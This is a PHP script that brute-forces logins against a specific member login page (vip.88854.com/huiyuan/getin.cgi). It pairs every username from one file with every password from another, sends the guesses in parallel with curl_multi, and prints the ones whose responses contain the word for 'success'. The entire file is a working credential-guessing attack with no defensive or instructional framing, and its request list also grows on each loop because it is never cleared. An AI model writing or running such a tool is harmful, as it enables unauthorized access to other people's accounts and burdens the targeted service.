<?php
header("Content-type:text/html;charset=gbk");
set_time_limit(0);
function multiple_threads_request($nodes){ 
         $mh = curl_multi_init(); 
         $curl_array = array(); 
         foreach($nodes as $i => $url) 
         { 
             $curl_array[$i] = curl_init($url); 
             curl_setopt($curl_array[$i], CURLOPT_RETURNTRANSFER, true); 
             curl_multi_add_handle($mh, $curl_array[$i]); 
         } 
         $running = NULL; 
         do { 
             usleep(10000); 
             curl_multi_exec($mh,$running); 
         } while($running > 0); 
         
         $res = array(); 
         foreach($nodes as $i => $url) 
         { 	
			if(strpos(strip_tags(curl_multi_getcontent($curl_array[$i])), '成功')){
				$res[] = $url;
			}
         } 
         
         foreach($nodes as $i => $url){ 
             curl_multi_remove_handle($mh, $curl_array[$i]); 
         } 
         curl_multi_close($mh);        
         return $res; 
}
$username 	= file('username.txt');
$passwd 	= file('password.txt');
$url 		= 'http://vip.88854.com/huiyuan/getin.cgi';
$data 		= array();
$i 			= 0;

echo '<pre>';
foreach($username as $user){
	foreach ($passwd as $key => $pass) {
		$data[$i++] = $url."?id=&username=".trim($user)."&passwd=".trim($pass);
	}
	print_r(multiple_threads_request($data));
}

//print_r($data);die;
 
?>